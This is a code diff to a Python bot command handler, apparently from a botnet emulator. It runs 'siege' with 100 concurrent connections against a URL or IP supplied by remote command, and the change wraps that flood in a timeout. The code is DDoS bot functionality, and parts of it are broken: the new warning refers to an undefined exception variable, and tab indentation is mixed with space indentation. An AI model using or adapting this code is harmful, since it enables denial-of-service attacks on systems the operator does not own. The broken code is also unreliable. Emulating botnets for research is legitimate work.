@@ -27,7 +27,7 @@ class BotCommands(object):
                 logging.debug("siege: %s" % self.ddos_process.communicate())
 
             if url is not None and validators.url(url):
-                cmdstr = "siege -c 100 -t %ds %s "%(timeout + 2, timeout, url)
+		cmdstr = "timeout -k %ds siege -c 100 -t %ds %s "%(timeout + 2, timeout, url)
                 logging.debug(cmdstr)
                 ddos_process = subprocess.Popen(shlex.split(cmdstr))
             elif ip is not None and validators.ipv4(ip) or validators.ipv6(ip):
@@ -73,7 +73,7 @@ def executeCurrentCommand(command):
         retval = methodToCall(cmdobject, **command["kwargs"])
         return retval
     except TypeError:
-        logging.warning("Command %s got invalid parameters: %s"%(command["command"], command["kwargs"]))
+	logging.warning("Command %s(**%s) could not be executed: %s"%(command["command"], command["kwargs"], ex))
 
 if __name__ == '__main__':
     logging.basicConfig(**emu_config.logging_config)
